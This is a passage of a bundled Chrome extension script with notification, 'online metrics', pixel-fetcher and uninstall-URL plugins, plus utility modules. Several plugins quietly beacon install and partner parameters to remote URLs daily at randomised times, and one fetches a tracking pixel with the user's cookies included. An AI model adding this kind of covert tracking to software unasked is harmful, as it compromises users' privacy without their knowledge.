          return console.error('Configuration is not allowed');
        }
        console.info('Configuration is allowed');
        _this8.__scheduler.schedule('notification:' + configuration.id, configuration.schedule.getNextDate(), _this8.__prepareNotification.bind(_this8, configuration));
      });
    }
  }, {
    key: '__createTab',
    value: function __createTab(url) {
      return (0, _chromeUtils.wrapChromeApi)(chrome.tabs, 'create', { url: url });
    }
  }, {
    key: '__fetchRbUrl',
    value: function __fetchRbUrl(url) {
      return new FetcherClass(url + '?rnd=' + Date.now().toString()).fetch();
    }
  }, {
    key: '__sendMetric',
    value: function __sendMetric(action) {
      return this.__metricSender.send(_extends({ action: action }, this.__baseMetricOptions));
    }
  }]);

  return NotificationsPlugin;
}(_basePlugin2.default);

exports.default = NotificationsPlugin;

},{"../common/url-fetcher":46,"../constants/mrds-settings":49,"../modules/notifications/constants/notification-schedule-types":74,"../modules/notifications/factory/notification-factory":75,"../modules/notifications/notification-manager":83,"../utils/chrome-utils":99,"../utils/param-utils":103,"./base-plugin":92,"async-es/each":2}],96:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _slicedToArray = function () { function sliceIterator(arr, i) { var _arr = []; var _n = true; var _d = false; var _e = undefined; try { for (var _i = arr[Symbol.iterator](), _s; !(_n = (_s = _i.next()).done); _n = true) { _arr.push(_s.value); if (i && _arr.length === i) break; } } catch (err) { _d = true; _e = err; } finally { try { if (!_n && _i["return"]) _i["return"](); } finally { if (_d) throw _e; } } return _arr; } return function (arr, i) { if (Array.isArray(arr)) { return arr; } else if (Symbol.iterator in Object(arr)) { return sliceIterator(arr, i); } else { throw new TypeError("Invalid attempt to destructure non-iterable instance"); } }; }();

var _extends = Object.assign || function (target) { for (var i = 1; i < arguments.length; i++) { var source = arguments[i]; for (var key in source) { if (Object.prototype.hasOwnProperty.call(source, key)) { target[key] = source[key]; } } } return target; };

var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

var _basePlugin = require('./base-plugin');

var _basePlugin2 = _interopRequireDefault(_basePlugin);

var _mrdsSettings = require('../constants/mrds-settings');

var mrdsSettings = _interopRequireWildcard(_mrdsSettings);

var _extensionDetails = require('../common/extension-details');

var _extensionDetails2 = _interopRequireDefault(_extensionDetails);

var _metricSenders = require('../modules/metric-senders');

var _metricSenders2 = _interopRequireDefault(_metricSenders);

var _dateUtils = require('../utils/date-utils');

var _paramUtils = require('../utils/param-utils');

var paramUtils = _interopRequireWildcard(_paramUtils);

function _interopRequireWildcard(obj) { if (obj && obj.__esModule) { return obj; } else { var newObj = {}; if (obj != null) { for (var key in obj) { if (Object.prototype.hasOwnProperty.call(obj, key)) newObj[key] = obj[key]; } } newObj.default = obj; return newObj; } }

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

function _toConsumableArray(arr) { if (Array.isArray(arr)) { for (var i = 0, arr2 = Array(arr.length); i < arr.length; i++) { arr2[i] = arr[i]; } return arr2; } else { return Array.from(arr); } }

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

function _possibleConstructorReturn(self, call) { if (!self) { throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); } return call && (typeof call === "object" || typeof call === "function") ? call : self; }

function _inherits(subClass, superClass) { if (typeof superClass !== "function" && superClass !== null) { throw new TypeError("Super expression must either be null or a function, not " + typeof superClass); } subClass.prototype = Object.create(superClass && superClass.prototype, { constructor: { value: subClass, enumerable: false, writable: true, configurable: true } }); if (superClass) Object.setPrototypeOf ? Object.setPrototypeOf(subClass, superClass) : subClass.__proto__ = superClass; }

var GO_URL_KEY = 'go_metric_url';
var MRDS_URL_KEY = 'mrds_metric_url';
var PARTNER_URL_KEY = 'partner_product_online_url';

var OnlineMetricsPlugin = function (_BasePlugin) {
  _inherits(OnlineMetricsPlugin, _BasePlugin);

  function OnlineMetricsPlugin(metricManager, scheduler, mrdsConfig, goConfig, partnerInstallConfig) {
    _classCallCheck(this, OnlineMetricsPlugin);

    var _this = _possibleConstructorReturn(this, Object.getPrototypeOf(OnlineMetricsPlugin).call(this, 'OnlineMetricsPlugin'));

    _this.__metricManager = metricManager;
    _this.__scheduler = scheduler;
    _this.__mrdsConfig = mrdsConfig;
    _this.__goConfig = goConfig;
    _this.__partnerInstallConfig = partnerInstallConfig;
    return _this;
  }

  _createClass(OnlineMetricsPlugin, [{
    key: 'run',
    value: function run() {
      var _this2 = this;

      return this.__configureMetrics().then(function () {
        return _this2.__sendMetrics();
      });
    }
  }, {
    key: '__configureMetrics',
    value: function __configureMetrics() {
      var _this3 = this;

      return this.getHost().getExtensionData().then(function (extensionData) {
        var distributionParameters = paramUtils.createMapper(mrdsSettings.MAPPINGS)(paramUtils.filter.apply(paramUtils, [extensionData].concat(_toConsumableArray(mrdsSettings.EXCLUDED_FIELDS))));
        var extensionParameters = paramUtils.createMapper({ id: 'extid' })(paramUtils.subset(_extensionDetails2.default, 'version', 'id'));
        var commonParameters = _extends({}, extensionParameters, distributionParameters);

        _this3.__metricManager.addSender(_this3.__createMrdsMetricSender(_this3.__mrdsConfig, extensionData, commonParameters)).addSender(_this3.__createGoMetricSender(_this3.__goConfig, extensionData, commonParameters));

        if (paramUtils.isNotEmpty(extensionData, PARTNER_URL_KEY)) {
          _this3.__metricManager.addSender(_this3.__createPartnerOnlineMetricSender(_this3.__partnerInstallConfig, extensionData, commonParameters));
        }
      });
    }
  }, {
    key: '__sendMetrics',
    value: function __sendMetrics() {
      var _this4 = this;

      this.__metricManager.sendMetrics().then(function () {
        var alarmTime = (0, _dateUtils.tomorrowWithRandomTime)();
        _this4.__scheduler.schedule('SendOnlineMetric', alarmTime, _this4.__sendMetrics.bind(_this4));
      });
    }
  }, {
    key: '__createMrdsMetricSender',
    value: function __createMrdsMetricSender(config, extensionData) {
      var commonParameters = arguments.length <= 2 || arguments[2] === undefined ? {} : arguments[2];

      var _ref = paramUtils.isNotEmpty(extensionData, MRDS_URL_KEY) ? [extensionData[MRDS_URL_KEY], true] : [config.url, paramUtils.isUrlTemplate(config.url)];

      var _ref2 = _slicedToArray(_ref, 2);

      var url = _ref2[0];
      var isTemplate = _ref2[1];

      var parameters = _extends({
        type: 'product_online_metric'
      }, commonParameters, paramUtils.generateTargetParameters(extensionData.mrds_parameters || []), config.parameters);
      return new _metricSenders2.default.DailyMetricSender(url, parameters, isTemplate, false, config.storage);
    }
  }, {
    key: '__createGoMetricSender',
    value: function __createGoMetricSender(config, extensionData) {
      var commonParameters = arguments.length <= 2 || arguments[2] === undefined ? {} : arguments[2];

      var _ref3 = paramUtils.isNotEmpty(extensionData, GO_URL_KEY) ? [extensionData[GO_URL_KEY], true] : [config.url, paramUtils.isUrlTemplate(config.url)];

      var _ref4 = _slicedToArray(_ref3, 2);

      var url = _ref4[0];
      var isTemplate = _ref4[1];

      var parameters = _extends({}, paramUtils.subset(commonParameters, 'install_id', 'product_id', 'gp', 'kind'), paramUtils.generateTargetParameters(extensionData.go_parameters || []), config.parameters);
      return new _metricSenders2.default.DailyMetricSender(url, parameters, isTemplate, true, config.storage, false);
    }
  }, {
    key: '__createPartnerOnlineMetricSender',
    value: function __createPartnerOnlineMetricSender(config, extensionData) {
      var commonParameters = arguments.length <= 2 || arguments[2] === undefined ? {} : arguments[2];

      var url = extensionData[PARTNER_URL_KEY];
      var parameters = _extends({}, commonParameters, paramUtils.generateTargetParameters(extensionData.partner_install_parameters || []), this.__partnerInstallConfig.parameters);
      return new _metricSenders2.default.OnceMetricSender(url, parameters, true, false, config.storage);
    }
  }]);

  return OnlineMetricsPlugin;
}(_basePlugin2.default);

exports.default = OnlineMetricsPlugin;

},{"../common/extension-details":41,"../constants/mrds-settings":49,"../modules/metric-senders":68,"../utils/date-utils":100,"../utils/param-utils":103,"./base-plugin":92}],97:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

var _basePlugin = require('./base-plugin');

var _basePlugin2 = _interopRequireDefault(_basePlugin);

var _dateUtils = require('../utils/date-utils');

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

function _possibleConstructorReturn(self, call) { if (!self) { throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); } return call && (typeof call === "object" || typeof call === "function") ? call : self; }

function _inherits(subClass, superClass) { if (typeof superClass !== "function" && superClass !== null) { throw new TypeError("Super expression must either be null or a function, not " + typeof superClass); } subClass.prototype = Object.create(superClass && superClass.prototype, { constructor: { value: subClass, enumerable: false, writable: true, configurable: true } }); if (superClass) Object.setPrototypeOf ? Object.setPrototypeOf(subClass, superClass) : subClass.__proto__ = superClass; }

var PixelFetcherPlugin = function (_BasePlugin) {
  _inherits(PixelFetcherPlugin, _BasePlugin);

  function PixelFetcherPlugin(pixelUrl, scheduler) {
    _classCallCheck(this, PixelFetcherPlugin);

    var _this = _possibleConstructorReturn(this, Object.getPrototypeOf(PixelFetcherPlugin).call(this, 'PixelFetcherPlugin'));

    _this.__pixelUrl = pixelUrl;
    _this.__scheduler = scheduler;
    return _this;
  }

  _createClass(PixelFetcherPlugin, [{
    key: 'run',
    value: function run() {
      return this.__fetchPixel(this.__pixelUrl);
    }
  }, {
    key: '__fetchPixel',
    value: function __fetchPixel(url) {
      var _this2 = this;

      return fetch(url, { cache: 'no-store', credentials: 'include' }).then(function () {
        var alarmTime = (0, _dateUtils.tomorrow)();
        alarmTime.setSeconds(Math.floor(Math.random() * 60 * 60 * 2));
        _this2.__scheduler.schedule('FetchRbPixel', alarmTime, _this2.__fetchPixel.bind(_this2, url));
      });
    }
  }]);

  return PixelFetcherPlugin;
}(_basePlugin2.default);

exports.default = PixelFetcherPlugin;

},{"../utils/date-utils":100,"./base-plugin":92}],98:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

var _basePlugin = require('./base-plugin');

var _basePlugin2 = _interopRequireDefault(_basePlugin);

var _paramUtils = require('../utils/param-utils');

var _queryString = require('../utils/query-string');

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

function _possibleConstructorReturn(self, call) { if (!self) { throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); } return call && (typeof call === "object" || typeof call === "function") ? call : self; }

function _inherits(subClass, superClass) { if (typeof superClass !== "function" && superClass !== null) { throw new TypeError("Super expression must either be null or a function, not " + typeof superClass); } subClass.prototype = Object.create(superClass && superClass.prototype, { constructor: { value: subClass, enumerable: false, writable: true, configurable: true } }); if (superClass) Object.setPrototypeOf ? Object.setPrototypeOf(subClass, superClass) : subClass.__proto__ = superClass; }

var EXCLUDED_FIELDS = ['fr', 'product_type', 'go_parameters', 'go_metric_url', 'mrds_parameters', 'mrds_metric_url', 'partner_product_online_url', 'partner_install_parameters'];

var UninstallUrlPlugin = function (_BasePlugin) {
  _inherits(UninstallUrlPlugin, _BasePlugin);

  function UninstallUrlPlugin(uninstallUrl, cookieName, cookieFacade) {
    _classCallCheck(this, UninstallUrlPlugin);

    var _this = _possibleConstructorReturn(this, Object.getPrototypeOf(UninstallUrlPlugin).call(this, 'UninstallUrlPlugin'));

    _this.__cookieName = cookieName;
    _this.__cookieFacade = cookieFacade;
    _this.__uninstallUrl = uninstallUrl;
    return _this;
  }

  _createClass(UninstallUrlPlugin, [{
    key: 'run',
    value: function run() {
      var _this2 = this;

      return this.getHost().getExtensionData().then(function (extensionData) {
        var parameters = _paramUtils.filter.apply(undefined, [extensionData].concat(EXCLUDED_FIELDS));
        var queryString = (0, _queryString.convertObjectToQueryString)(parameters);
        return _this2.__cookieFacade.setCookie(queryString).then(function () {
          var url = _this2.__uninstallUrl + '?cookie=' + encodeURIComponent(_this2.__cookieName);
          chrome.runtime.setUninstallURL(url);
        });
      });
    }
  }]);

  return UninstallUrlPlugin;
}(_basePlugin2.default);

exports.default = UninstallUrlPlugin;

},{"../utils/param-utils":103,"../utils/query-string":104,"./base-plugin":92}],99:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});
exports.wrapChromeApi = wrapChromeApi;
function wrapChromeApi(namespace, method) {
  for (var _len = arguments.length, args = Array(_len > 2 ? _len - 2 : 0), _key = 2; _key < _len; _key++) {
    args[_key - 2] = arguments[_key];
  }

  console.log('Chrome API called', namespace, method, args);
  return new Promise(function (resolve, reject) {
    var callback = function callback(result) {
      if (chrome.runtime.lastError) {
        console.error('Chrome API Error:', chrome.runtime.lastError);
        return reject(chrome.runtime.lastError);
      }
      console.info('Chrome API Response', result);
      return resolve(result);
    };
    namespace[method].apply(namespace, args.concat(callback));
  });
}

},{}],100:[function(require,module,exports){
"use strict";

Object.defineProperty(exports, "__esModule", {
  value: true
});
exports.today = today;
exports.tomorrow = tomorrow;
exports.tomorrowWithRandomTime = tomorrowWithRandomTime;
exports.isInFuture = isInFuture;
exports.isWithinRange = isWithinRange;
exports.isWithinTimeInterval = isWithinTimeInterval;
function today() {
  var date = new Date();
  date.setUTCHours(0, 0, 0, 0);
  return date;
}

function tomorrow() {
  var date = today();
  date.setDate(date.getDate() + 1);
  return date;
}

function tomorrowWithRandomTime() {
  var date = tomorrow();
  date.setSeconds(Math.floor(Math.random() * 60 * 60 * 2));
  return date;
}

function isInFuture(date) {
  var now = new Date();
  return date.getTime() >= now.getTime();
}

function isWithinRange(currentDate, dateStart, dateEnd) {
  var currentTime = currentDate.getTime();
  return currentTime >= dateStart.getTime() && currentTime <= dateEnd.getTime();
}

function isWithinTimeInterval(currentDate, startTime, endTime) {
  var currentHours = currentDate.getHours();
  var currentMinutes = currentDate.getMinutes();
  return currentHours >= startTime.hours && currentMinutes >= startTime.minutes && currentHours <= endTime.hours && currentMinutes <= endTime.minutes;
}

},{}],101:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

exports.default = function () {
  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (char) {
    var r = Math.random() * 16 | 0;
    var v = char === 'x' ? r : r & 0x3 | 0x8;
    return v.toString(16);
  });
};

;

},{}],102:[function(require,module,exports){
"use strict";

Object.defineProperty(exports, "__esModule", {
  value: true
});
exports.getRandomArbitrary = getRandomArbitrary;
exports.getRandomInt = getRandomInt;
function getRandomArbitrary(min, max) {
  return Math.random() * (max - min) + min;
}

function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

},{}],103:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});
exports.createMapper = createMapper;
exports.generateTargetParameters = generateTargetParameters;
exports.getRandomRnd = getRandomRnd;
exports.formatValue = formatValue;
exports.convertParametersToArray = convertParametersToArray;
exports.convertParametersToQueryString = convertParametersToQueryString;
exports.addParametersToUrlTemplate = addParametersToUrlTemplate;
exports.normalizeUrlTemplate = normalizeUrlTemplate;
exports.subset = subset;
exports.filter = filter;
exports.isNotEmpty = isNotEmpty;
exports.getIfNotEmpty = getIfNotEmpty;
exports.isUrlTemplate = isUrlTemplate;
exports.arrayToSet = arrayToSet;

var _urlTemplate = require('url-template');

var _urlTemplate2 = _interopRequireDefault(_urlTemplate);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

function createMapper(mappings) {
  return function (source) {
    var result = {};
    Object.keys(source).forEach(function (key) {
      if (mappings.hasOwnProperty(key)) {
        result[mappings[key]] = source[key];
      } else {
        result[key] = source[key];
      }
    });
    return result;
  };
}

function generateTargetParameters(source) {
  var result = {};
  source.forEach(function (item) {
    result[item.Id] = item.Value;
  });
  return result;
}

function getRandomRnd() {
  return Math.floor(Math.random() * 100 * 1000 * 1000);
}

function formatValue(value) {
  if (typeof value === 'boolean') {
    return value ? 1 : 0;
  }
  return value;
}

function convertParametersToArray(source) {
  var result = [];
  Object.keys(source).forEach(function (key) {
    result.push({ key: key, value: source[key] });
  });
  return result;
}

function convertParametersToQueryString(parameters) {
  return parameters.filter(function (param) {
    return param.value !== undefined;
  }).map(function (param) {
    return encodeURIComponent(param.key) + '=' + encodeURIComponent(formatValue(param.value));
  }).join('&');
}

function addParametersToUrlTemplate(template, parameters) {
  return _urlTemplate2.default.parse(template).expand(parameters);
}

function normalizeUrlTemplate(template) {
  return template.replace(/\$(\{\w+\})/gi, '$1');
}

function subset(source) {
  var result = {};

  for (var _len = arguments.length, keys = Array(_len > 1 ? _len - 1 : 0), _key = 1; _key < _len; _key++) {
    keys[_key - 1] = arguments[_key];
  }

  keys.forEach(function (key) {
    if (source.hasOwnProperty(key) && source[key] !== undefined) {
      result[key] = source[key];
    }
  });
  return result;
}

function filter(source) {
  for (var _len2 = arguments.length, keys = Array(_len2 > 1 ? _len2 - 1 : 0), _key2 = 1; _key2 < _len2; _key2++) {
    keys[_key2 - 1] = arguments[_key2];
  }

  var result = {};
  Object.keys(source).forEach(function (key) {
    if (keys.indexOf(key) === -1) {
      result[key] = source[key];
    }
  });
  return result;
}

function isNotEmpty(source, prop) {
  return source.hasOwnProperty(prop) && source[prop] !== undefined && source[prop] !== '';
}

function getIfNotEmpty(source, prop, defaultValue) {
  return isNotEmpty(source, prop) ? source[prop] : defaultValue;
}

function isUrlTemplate(source) {
  return (/\{\w+\}/gi.test(source)
  );
}

function arrayToSet(source) {
  var result = new Set();
  source.forEach(result.add.bind(result));
  return result;
}

},{"url-template":39}],104:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _slicedToArray = function () { function sliceIterator(arr, i) { var _arr = []; var _n = true; var _d = false; var _e = undefined; try { for (var _i = arr[Symbol.iterator](), _s; !(_n = (_s = _i.next()).done); _n = true) { _arr.push(_s.value); if (i && _arr.length === i) break; } } catch (err) { _d = true; _e = err; } finally { try { if (!_n && _i["return"]) _i["return"](); } finally { if (_d) throw _e; } } return _arr; } return function (arr, i) { if (Array.isArray(arr)) { return arr; } else if (Symbol.iterator in Object(arr)) { return sliceIterator(arr, i); } else { throw new TypeError("Invalid attempt to destructure non-iterable instance"); } }; }();

exports.convertObjectToQueryString = convertObjectToQueryString;
exports.parseQueryString = parseQueryString;
function convertObjectToQueryString(source) {
  var result = [];
  Object.keys(source).forEach(function (key) {
    if (source[key] !== undefined) {
      result.push(encodeURIComponent(key) + '=' + encodeURIComponent(source[key]));
    }
  });
  return result.join('&');
}

function parseQueryString(string) {
  var pairs = string.split('&');
  var result = {};
  pairs.forEach(function (item) {
    var pair = item.split('=');

    var _pair = _slicedToArray(pair, 2);

    var name = _pair[0];
    var value = _pair[1];

    if (value !== undefined) {
      result[name] = decodeURIComponent(value);
    }
  });
  return result;
}

},{}]},{},[52]);
